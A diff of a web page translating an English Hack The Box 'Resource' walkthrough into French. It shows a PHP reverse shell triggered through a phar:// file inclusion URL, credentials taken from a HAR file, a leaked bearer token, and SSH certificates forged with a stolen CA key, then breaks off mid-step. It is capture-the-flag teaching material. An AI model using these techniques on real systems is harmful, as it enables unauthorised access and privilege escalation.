@@ -1,15 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
     <head>
         <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user." />
+<meta name="description" content="Platforme: Hack The Box Lien: Resource Niveau: Difficile OS: Linux Resource&amp;quot; met l&amp;rsquo;accent sur l&amp;rsquo;exploitation des fichiers SSH et des certificats d&amp;rsquo;autorité. L&amp;rsquo;accès initial est obtenu via une attaque de désérialisation PHAR ciblant une fonctionnalité de téléchargement de fichiers. Ensuite, des identifiants d&amp;rsquo;utilisateur sont extraits d&amp;rsquo;un fichier HAR, permettant de progresser vers un autre utilisateur. La découverte de clés d&amp;rsquo;autorité de certification nous permet de générer des clés SSH pour accéder à un troisième utilisateur." />
 <meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="https://scorpiosec.com/posts/2024/11/htb-resource/" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/11/htb-resource/" />
 
 
     <title>
@@ -37,20 +37,20 @@
 
 
 <meta itemprop="name" content="HTB: Resource">
-<meta itemprop="description" content="Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user."><meta itemprop="datePublished" content="2024-11-22T18:48:22-06:00" />
+<meta itemprop="description" content="Platforme: Hack The Box Lien: Resource Niveau: Difficile OS: Linux Resource&quot; met l&rsquo;accent sur l&rsquo;exploitation des fichiers SSH et des certificats d&rsquo;autorité. L&rsquo;accès initial est obtenu via une attaque de désérialisation PHAR ciblant une fonctionnalité de téléchargement de fichiers. Ensuite, des identifiants d&rsquo;utilisateur sont extraits d&rsquo;un fichier HAR, permettant de progresser vers un autre utilisateur. La découverte de clés d&rsquo;autorité de certification nous permet de générer des clés SSH pour accéder à un troisième utilisateur."><meta itemprop="datePublished" content="2024-11-22T18:48:22-06:00" />
 <meta itemprop="dateModified" content="2024-11-22T18:48:22-06:00" />
-<meta itemprop="wordCount" content="2332"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Resource/Resource.png" />
+<meta itemprop="wordCount" content="2459"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Resource/Resource.png" />
 <meta itemprop="keywords" content="Hack The Box," />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Resource/Resource.png" /><meta name="twitter:title" content="HTB: Resource"/>
-<meta name="twitter:description" content="Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user."/>
+<meta name="twitter:description" content="Platforme: Hack The Box Lien: Resource Niveau: Difficile OS: Linux Resource&quot; met l&rsquo;accent sur l&rsquo;exploitation des fichiers SSH et des certificats d&rsquo;autorité. L&rsquo;accès initial est obtenu via une attaque de désérialisation PHAR ciblant une fonctionnalité de téléchargement de fichiers. Ensuite, des identifiants d&rsquo;utilisateur sont extraits d&rsquo;un fichier HAR, permettant de progresser vers un autre utilisateur. La découverte de clés d&rsquo;autorité de certification nous permet de générer des clés SSH pour accéder à un troisième utilisateur."/>
 
 
 
     <meta property="og:title" content="HTB: Resource" />
-<meta property="og:description" content="Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user." />
+<meta property="og:description" content="Platforme: Hack The Box Lien: Resource Niveau: Difficile OS: Linux Resource&quot; met l&rsquo;accent sur l&rsquo;exploitation des fichiers SSH et des certificats d&rsquo;autorité. L&rsquo;accès initial est obtenu via une attaque de désérialisation PHAR ciblant une fonctionnalité de téléchargement de fichiers. Ensuite, des identifiants d&rsquo;utilisateur sont extraits d&rsquo;un fichier HAR, permettant de progresser vers un autre utilisateur. La découverte de clés d&rsquo;autorité de certification nous permet de générer des clés SSH pour accéder à un troisième utilisateur." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://scorpiosec.com/posts/2024/11/htb-resource/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Resource/Resource.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/11/htb-resource/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Resource/Resource.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-11-22T18:48:22-06:00" />
 <meta property="article:modified_time" content="2024-11-22T18:48:22-06:00" />
 
@@ -115,14 +115,14 @@ if (!doNotTrack) {
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
         <div class="submenu">
             <li class="dropdown">
-                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
                 <div class="dropdown-content">
                     
                         
-                            <a title="fr" href="https://scorpiosec.com/fr/posts/2024/11/htb-resource/">fr</a>
+                            <a title="en" href="https://scorpiosec.com/posts/2024/11/htb-resource/">en</a>
                         
                     
                 </div>
@@ -158,11 +158,11 @@ if (!doNotTrack) {
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        11 minutes
+        12 minutes
 
-         | Also available in
+         | Aussi disponible en
           
-              <a href="https://scorpiosec.com/fr/posts/2024/11/htb-resource/"><span class="flag fi fi-fr"></span></a>
+              <a href="https://scorpiosec.com/posts/2024/11/htb-resource/"><span class="flag fi fi-gb"></span></a>
           
         
       </p>
@@ -170,7 +170,7 @@ if (!doNotTrack) {
 
     <article>
       <h1 class="post-title">
-        <a href="https://scorpiosec.com/posts/2024/11/htb-resource/">HTB: Resource</a>
+        <a href="https://scorpiosec.com/fr/posts/2024/11/htb-resource/">HTB: Resource</a>
       </h1>
 
       
@@ -178,20 +178,20 @@ if (!doNotTrack) {
       
         <hr />
         <aside id="toc">
-          <div class="toc-title">Table of Contents</div>
+          <div class="toc-title">Table des matières</div>
           <nav id="TableOfContents">
   <ul>
-    <li><a href="#scanning">Scanning</a></li>
-    <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#initial-foothold">Initial Foothold</a>
+    <li><a href="#balayage">Balayage</a></li>
+    <li><a href="#enumération">Enumération</a></li>
+    <li><a href="#accès-initial">Accès initial</a>
       <ul>
-        <li><a href="#lateral-movement-msainristil-shell-on-itrc-host">Lateral movement (msainristil shell on itrc host)</a></li>
-        <li><a href="#lateral-movement-zzinter-shell-on-itrc-host">Lateral movement (zzinter shell on itrc host)</a></li>
-        <li><a href="#lateral-movement-support-shell-on-ssg-host">Lateral movement (support shell on ssg host)</a></li>
-        <li><a href="#lateral-movement-zzinter-shell-on-ssg-host">Lateral movement (zzinter shell on ssg host)</a></li>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-msainristil-sur-lhôte-itrc">Mouvement latéral (Shell en tant que msainristil sur l&rsquo;hôte itrc)</a></li>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-zzinter-sur-lhôte-itrc">Mouvement latéral (Shell en tant que zzinter sur l&rsquo;hôte itrc)</a></li>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-support-sur-lhôte-ssg">Mouvement latéral (Shell en tant que support sur l&rsquo;hôte ssg)</a></li>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-zzinter-sur-lhôte-ssg">Mouvement latéral (Shell en tant que zzinter sur l&rsquo;hôte ssg)</a></li>
       </ul>
     </li>
-    <li><a href="#privilege-escalation-root-shell-on-ssg-host">Privilege Escalation (root shell on ssg host)</a></li>
+    <li><a href="#elévation-de-privilèges-shell-en-tant-que-root-sur-lhôte-ssg">Elévation de Privilèges (Shell en tant que root sur l&rsquo;hôte ssg)</a></li>
   </ul>
 </nav>
         </aside>
@@ -201,19 +201,19 @@ if (!doNotTrack) {
 
       <div class="post-content">
         <ul>
-<li>Platform: Hack The Box</li>
-<li>Link: <a href="https://app.hackthebox.com/machines/Resource" target="_blank" >Resource</a>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Resource" target="_blank" >Resource</a>
 
 </li>
-<li>Level: Hard</li>
+<li>Niveau: Difficile</li>
 <li>OS: Linux</li>
 </ul>
 <hr>
-<p>Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user. After gaining access to a different host, we escalate our privileges by exploiting a glob injection vulnerability in a bash script, ultimately gaining root access.</p>
-<p>Target IP address - <code>10.10.11.27</code></p>
-<h2 id="scanning">Scanning</h2>
+<p>Resource&quot; met l&rsquo;accent sur l&rsquo;exploitation des fichiers SSH et des certificats d&rsquo;autorité. L&rsquo;accès initial est obtenu via une attaque de désérialisation PHAR ciblant une fonctionnalité de téléchargement de fichiers. Ensuite, des identifiants d&rsquo;utilisateur sont extraits d&rsquo;un fichier HAR, permettant de progresser vers un autre utilisateur. La découverte de clés d&rsquo;autorité de certification nous permet de générer des clés SSH pour accéder à un troisième utilisateur. Enfin, une vulnérabilité d&rsquo;injection de globes dans un script bash est exploitée pour élever nos privilèges et obtenir l&rsquo;accès root sur un hôte différent.</p>
+<p>Adresse IP cible - <code>10.10.11.27</code></p>
+<h2 id="balayage">Balayage</h2>
 <pre tabindex="0"><code>./nmap_scan.sh 10.10.11.27 Resource
-</code></pre><p><strong>Results</strong></p>
+</code></pre><p><strong>Résultats</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 22,80,2222
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-22 18:47 CST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.27
@@ -235,67 +235,67 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.97 seconds
-</span></span></code></pre></div><p>The target is running two different versions of SSH: 9.2p1 on port 22 and 8.9p1 on port 2222. It also has HTTP running on port 80 with a redirection to <code>http://itrc.ssg.htb/</code> which we add it to the <code>etc/hosts</code> file.</p>
+</span></span></code></pre></div><p>La cible utilise deux versions différentes de SSH: 9.2p1 sur le port 22 et 8.9p1 sur le port 2222. Elle a aussi un serveur web (HTTP) fonctionnant sur le port 80 avec une redirection vers <code>http://itrc.ssg.htb/</code> que nous ajoutons au fichier <code>etc/hosts</code>.</p>
 <pre tabindex="0"><code>sudo echo &#34;10.10.11.27 itrc.ssg.htb&#34; | sudo tee -a /etc/hosts
-</code></pre><h2 id="enumeration">Enumeration</h2>
-<p>We find a website for a resource center at <code>http://itrc.ssg.htb/</code> with a register/login feature.</p>
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>Nous trouvons un site web pour un centre de ressources à <code>http://itrc.ssg.htb/</code> avec une fonction d&rsquo;authentification.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/resource-website.png" alt="Resource website"></p>
-<p>After logging in with our newly created account we are able to submit a new ticket at <code>http://itrc.ssg.htb/?page=dashboard</code>.</p>
+<p>Après s&rsquo;être connecté avec notre compte nouvellement créé, nous pouvons soumettre un nouveau ticket à <code>http://itrc.ssg.htb/?page=dashboard</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/dashboard-page.png" alt="Ticekts list"></p>
-<p>Clicking on <code>New Ticket</code> takes us to <code>http://itrc.ssg.htb/?page=create_ticket</code>.</p>
+<p>En cliquant sur <code>New Ticket</code>, on accède à <code>http://itrc.ssg.htb/?page=create_ticket</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/create_ticket.png" alt="New ticket creation"></p>
-<p>Two things are noteworthy here:</p>
+<p>Deux choses sont à noter ici :</p>
 <ul>
-<li>the <code>?page</code> parameter might be vulnerable to LFI</li>
-<li>we might be able to bypass the restrictions of the upload feature and upload a reverse shell</li>
+<li>le paramètre <code>?page</code> pourrait être vulnérable à la LFI</li>
+<li>nous pourrions être en mesure de contourner les restrictions de la fonction de téléchargement et de télécharger un shell inversé.</li>
 </ul>
-<p>Let&rsquo;s create a ticket and upload a random zip file to observe how the application works.</p>
+<p>Créons un ticket et téléchargeons un fichier zip aléatoire pour observer le fonctionnement de l&rsquo;application.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/test_zip.png" alt="file upload test"></p>
-<p>We can click anywhere on a specific ticket to open it and get more information.</p>
+<p>En cliquant sur un ticket spécifique, nous obtenons plus d&rsquo;informations.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/uploads_folder.png" alt="upload folder"></p>
-<p>While hovering over our file we learn that it is stored in the <code>/uploads</code> directory. With Wappalyzer we see that we are dealing with a PHP application, let&rsquo;s try uploading a PHP reverse shell.</p>
+<p>En survolant notre fichier, nous découvrons qu&rsquo;il est stocké dans le répertoire <code>/uploads</code>. Avec Wappalyzer nous réalisons que nous avons affaire à une application PHP, essayons d&rsquo;uploader un reverse shell PHP.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/wappalyzer.png" alt="wappalyzer"></p>
-<p>On <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+<p>Sur <a href="https://www.revshells.com/" target="_blank" >revshells</a>
 
- we can use the <code>PHP Ivan Sincek</code> shell to create a zip file and upload it on the target.</p>
+ nous pouvons utiliser le shell <code>PHP Ivan Sincek</code> pour créer un fichier zip et l&rsquo;uploader sur la cible.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/php_revshell_zip.png" alt="reverse shell zip"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/revshell_php.png" alt="reverse shell upload"></p>
-<p>Both <code>http://itrc.ssg.htb/?page=/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> and <code>http://itrc.ssg.htb/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> fail to trigger the reverse shell so we need to find another way of executing our file.</p>
+<p>Les url <code>http://itrc.ssg.htb/?page=/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> et <code>http://itrc.ssg.htb/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> ne parviennent pas à déclencher le reverse shell, nous devons donc trouver un autre moyen d&rsquo;exécuter notre fichier.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/revshell_fail.png" alt="reverse shell trigger failure"></p>
-<h2 id="initial-foothold">Initial Foothold</h2>
-<p>After some research we discover the PHAR (PHP Archive) deserialization attack explained <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization" target="_blank" >here</a>
+<h2 id="accès-initial">Accès initial</h2>
+<p>Après quelques recherches, nous découvrons l&rsquo;attaque de désérialisation PHAR (PHP Archive) expliquée <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization" target="_blank" >ici</a>
 
- and <a href="https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability" target="_blank" >here</a>
+ et <a href="https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability" target="_blank" >ici</a>
 
 .</p>
 <blockquote>
-<p>When we create a <code>.zip</code> archive containing the <code>revshell.php</code> file and access it using the <code>phar://</code> stream wrapper, PHP treats the <code>.zip</code> file as a PHAR-compatible archive. The <code>phar://</code> protocol allows PHP to directly access files within the archive, including executable PHP scripts. When the URL <code>http://itrc.ssg.htb/?page=phar://uploads/.../revshell</code> is processed, the server executes the <code>revshell.php</code> file within the archive as PHP code, triggering the reverse shell. This works because the server uses an insecure file inclusion mechanism (<code>include</code>, <code>require</code>, or similar) without properly validating or restricting the file path, allowing code execution through the <code>phar://</code> wrapper.</p>
+<p>Lorsque nous créons une archive <code>.zip</code> contenant le fichier <code>revshell.php</code> et que nous y accédons en utilisant le wrapper <code>phar://</code>, PHP traite le fichier <code>.zip</code> comme une archive compatible PHAR. Le protocole <code>phar://</code> permet à PHP d&rsquo;accéder directement aux fichiers de l&rsquo;archive, y compris les scripts PHP exécutables. Lorsque l&rsquo;URL <code>http://itrc.ssg.htb/?page=phar://uploads/.../revshell</code> est utilisée, le serveur exécute le fichier <code>revshell.php</code> dans l&rsquo;archive en tant que code PHP, déclenchant ainsi le reverse shell. Cette opération fonctionne parce que le serveur utilise un mécanisme d&rsquo;inclusion de fichier non sécurisé (<code>include</code>, <code>require</code>, ou similaire) sans valider ou restreindre correctement le chemin d&rsquo;accès au fichier.</p>
 </blockquote>
-<p>Using <code>http://itrc.ssg.htb/?page=phar://uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell</code> we successfully trigger the reverse shell. We obtain a connection on our listener as <code>www-data</code> and we are in <code>/var/www/itrc</code>.</p>
+<p>En utilisant <code>http://itrc.ssg.htb/?page=phar://uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell</code> nous déclenchons avec succès le reverse shell. Nous obtenons une connexion sur notre listener en tant que <code>www-data</code> et nous sommes dans <code>/var/www/itrc</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/phar_revshell.png" alt="phar reverse shell"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/foothold.png" alt="foothold"></p>
-<p>In the <code>uploads</code> directory we find many ZIP archives, we personally uploaded only two of them so let&rsquo;s see what the other ones contain.</p>
+<p>Dans le répertoire <code>uploads</code> nous trouvons de nombreuses archives ZIP, nous n&rsquo;en avons personnellement téléchargé que deux, voyons donc ce que contiennent les autres.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/uploads_folder_ontarget.png" alt="application upload directory"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/upload_directory_content.png" alt="upload directory content"></p>
-<p>We run the command below to extract all the archives in the folder.</p>
+<p>Nous exécutons la commande ci-dessous pour extraire toutes les archives du dossier.</p>
 <pre tabindex="0"><code>for file in *.zip; do unzip &#34;$file&#34;; done
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Resource/bulk_extraction.png" alt="bulk extraction"></p>
-<p>After the extraction we recover some public keys (for the Ed25519 and RSA algorithms), a <code>.har</code> file and the files we previuosly uploaded.</p>
+<p>Après l&rsquo;extraction, nous récupérons quelques clés publiques (pour les algorithmes Ed25519 et RSA), un fichier <code>.har</code> et les fichiers que nous avons précédemment téléchargés.</p>
 <blockquote>
-<p><code>.har</code> files are JSON-formatted text files containing detailed information about HTTP requests and responses during a browsing session.</p>
+<p>Un fichier <code>.HAR</code> (HTTP Archive) est un format de fichier utilisé pour enregistrer les détails des échanges HTTP entre un client (généralement un navigateur web) et un serveur.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/files_after_extraction.png" alt="files after extraction"></p>
-<h3 id="lateral-movement-msainristil-shell-on-itrc-host">Lateral movement (msainristil shell on itrc host)</h3>
-<p>With <code>cat /etc/passwd</code> we notice two users on the system <code>msainristil</code> and <code>zzinter</code>. Using <code>cat itrc.ssg.htb.har | grep msainristil</code> we recover some credentials which are <code>msainristil:82yards2closeit</code>.</p>
+<h3 id="mouvement-latéral-shell-en-tant-que-msainristil-sur-lhôte-itrc">Mouvement latéral (Shell en tant que msainristil sur l&rsquo;hôte itrc)</h3>
+<p>Nous trouvons deux utilisateurs sur le système: <code>msainristil</code> et <code>zzinter</code>. En utilisant <code>cat itrc.ssg.htb.har | grep msainristil</code> nous récupérons des identifiants qui sont <code>msainristil:82yards2closeit</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/user_list.png" alt="user list"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/msainristil_creds.png" alt="msainristil credentials"></p>
-<p>We login via SSH with the credentials obtained but still no user flag, instead we have some files related to a certificate of authority.</p>
-<p><code>ca-itrc</code> and <code>ca-itrc.pub</code> are very likely the private and public keys of a Certificate Authority used for signing certificates, which can include SSH keys or other types of certificates.</p>
+<p>Nous nous connectons via SSH avec les informations d&rsquo;identification obtenues, mais nous ne trouvons pas de drapeau utilisateur, mais des fichiers liés à un certificat d&rsquo;autorité.</p>
+<p><code>ca-itrc</code> et <code>ca-itrc.pub</code> sont très probablement les clés privée et publique d&rsquo;une autorité de certification utilisée pour signer des certificats, qui peuvent inclure des clés SSH ou d&rsquo;autres types de certificats.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/msainristil_files.png" alt="CA files"></p>
-<h3 id="lateral-movement-zzinter-shell-on-itrc-host">Lateral movement (zzinter shell on itrc host)</h3>
-<p>Since we have access to the CA private key, we can create a SSH key to login as <code>zzinter</code>.</p>
+<h3 id="mouvement-latéral-shell-en-tant-que-zzinter-sur-lhôte-itrc">Mouvement latéral (Shell en tant que zzinter sur l&rsquo;hôte itrc)</h3>
+<p>Puisque nous avons accès à la clé privée du CA, nous pouvons créer une clé SSH pour nous connecter en tant que <code>zzinter</code>.</p>
 <ol>
-<li>Create an SSH Key Pair for zzinter.</li>
+<li>Créer une paire de clés SSH pour zzinter.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
 </code></pre><table>
@@ -308,25 +308,25 @@ if (!doNotTrack) {
 <tbody>
 <tr>
 <td>ssh-keygen</td>
-<td>Command-line tool used to generate SSH keys.</td>
+<td>Outil de ligne de commande utilisé pour générer des clés SSH.</td>
 </tr>
 <tr>
 <td>-t rsa</td>
-<td>Specifies the type of key to create (RSA key pair in our case).</td>
+<td>Spécifie le type de clé à créer (paire de clés RSA dans notre cas).</td>
 </tr>
 <tr>
 <td>-b 4096</td>
-<td>Bit length, our RSA key will have a length of 4096 bits.</td>
+<td>Longueur des bits, notre clé RSA aura une longueur de 4096 bits.</td>
 </tr>
 <tr>
 <td>-f id_rsa_zzinter</td>
-<td>Specifies the filename.</td>
+<td>Spécifie le nom du fichier.</td>
 </tr>
 </tbody>
 </table>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/zzinter_keys.png" alt="zzinter keys"></p>
 <ol start="2">
-<li>Create the SSH Certificate for zzinter.</li>
+<li>Créez le certificat SSH pour zzinter.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -s ca-itrc -I zzinter_key_id -n zzinter -V +52w id_rsa_zzinter.pub
 </code></pre><table>
@@ -339,33 +339,33 @@ if (!doNotTrack) {
 <tbody>
 <tr>
 <td>-s ca-itrc</td>
-<td>Path to the CA&rsquo;s private key.</td>
+<td>Chemin d&rsquo;accès à la clé privée de l&rsquo;autorité de certification.</td>
 </tr>
 <tr>
 <td>-I zzinter_key_id</td>
-<td>Unique identifier for the certificate (you can pick any name).</td>
+<td>Identifiant unique pour le certificat (vous pouvez choisir n&rsquo;importe quel nom).</td>
 </tr>
 <tr>
 <td>-n zzinter</td>
-<td>The principal (user) for which the certificate is valid.</td>
+<td>Le principal (utilisateur) pour lequel le certificat est valide.</td>
 </tr>
 <tr>
 <td>-V +52w</td>
-<td>Sets validity period (52 weeks here).</td>
+<td>Définit la période de validité (ici 52 semaines).</td>
 </tr>
 <tr>
 <td>id_rsa_zzinter.pub</td>
-<td>The public key we are signing.</td>
+<td>La clé publique que nous signons.</td>
 </tr>
 </tbody>
 </table>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/zzinter_SSH_certificate.png" alt="zzinter SSH certificate"></p>
 <ol start="3">
-<li>Login using the SSH key.</li>
+<li>Se connecter à l&rsquo;aide de la clé SSH.</li>
 </ol>
 <pre tabindex="0"><code>ssh -i id_rsa_zzinter zzinter@itrc.ssg.htb
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Resource/zzinter_login.png" alt="zzinter SSH login"></p>
-<p>Below is the content of <code>sign_key_api.sh</code>. It automates the process of submitting a public SSH key to the signing service <code>signserv.ssg.htb</code> to generate a signed SSH certificate for a given user.</p>
+<p>Ci-dessous se trouve le contenu du script <code>sign_key_api.sh</code>. Il automatise le processus de soumission d&rsquo;une clé publique SSH au service de signature <code>signserv.ssg.htb</code> pour générer un certificat SSH signé pour un utilisateur donné.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>usage <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
@@ -404,72 +404,72 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>public_key<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat $public_key_file<span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>curl -s signserv.ssg.htb/v1/sign -d <span style="color:#e6db74">&#39;{&#34;pubkey&#34;: &#34;&#39;</span><span style="color:#e6db74">&#34;</span>$public_key<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#39;&#34;, &#34;username&#34;: &#34;&#39;</span><span style="color:#e6db74">&#34;</span>$username<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#39;&#34;, &#34;principals&#34;: &#34;&#39;</span><span style="color:#e6db74">&#34;</span>$principal<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#39;&#34;}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;</span>
-</span></span></code></pre></div><p>Let&rsquo;s use the same process from earlier to create a SSH key for root, and see if we find anything of interest there.</p>
+</span></span></code></pre></div><p>Utilisons le même processus que précédemment pour créer une clé SSH pour root, et voyons si nous y trouvons quelque chose d&rsquo;intéressant.</p>
 <pre tabindex="0"><code>ssh-keygen -t rsa -b 4096 -f id_rsa_root
 ssh-keygen -s ca-itrc -I root_key_id -n root -V +52w id_rsa_root.pub
 ssh -i id_rsa_root root@itrc.ssg.htb
-</code></pre><p>Unfortunately the root folder is empty, but we notice a different IP address mentioned (<code>172.223.0.3</code>). This probably means that we are inside a container that we need to break out of.</p>
+</code></pre><p>Malheureusement, le compte root est vide, mais nous remarquons une adresse IP différente mentionnée (<code>172.223.0.3</code>). Cela signifie probablement que nous sommes à l&rsquo;intérieur d&rsquo;un conteneur dont nous devons sortir.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/root_ssh.png" alt="root SSH login"></p>
-<h3 id="lateral-movement-support-shell-on-ssg-host">Lateral movement (support shell on ssg host)</h3>
-<p>The script contains a list of supported principals, so let&rsquo;s use one of them.</p>
+<h3 id="mouvement-latéral-shell-en-tant-que-support-sur-lhôte-ssg">Mouvement latéral (Shell en tant que support sur l&rsquo;hôte ssg)</h3>
+<p>Le script contient une liste d&rsquo;utilisateurs valides, nous allons donc utiliser l&rsquo;un d&rsquo;entre eux.</p>
 <ol>
-<li>Generate an SSH key for <code>support</code>.</li>
+<li>Générer une clé SSH pour <code>support</code>.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -t rsa -b 4096 -f id_rsa_support
 </code></pre><ol start="2">
-<li>We use the script to generate a signed SSH certificate for the supported principal support.</li>
+<li>Nous utilisons le script pour générer un certificat SSH signé.</li>
 </ol>
 <pre tabindex="0"><code>bash ./sign_key_api.sh id_rsa_support.pub support support
 </code></pre><ul>
-<li>You will receive the SSH certificate in OpenSSH format. You need to put it in a file but we do not have access to a text editor. So use <code>echo &quot;YOUR_SSH_CERTIFICATE&quot; &gt; id_rsa_support-cert.pub</code>.</li>
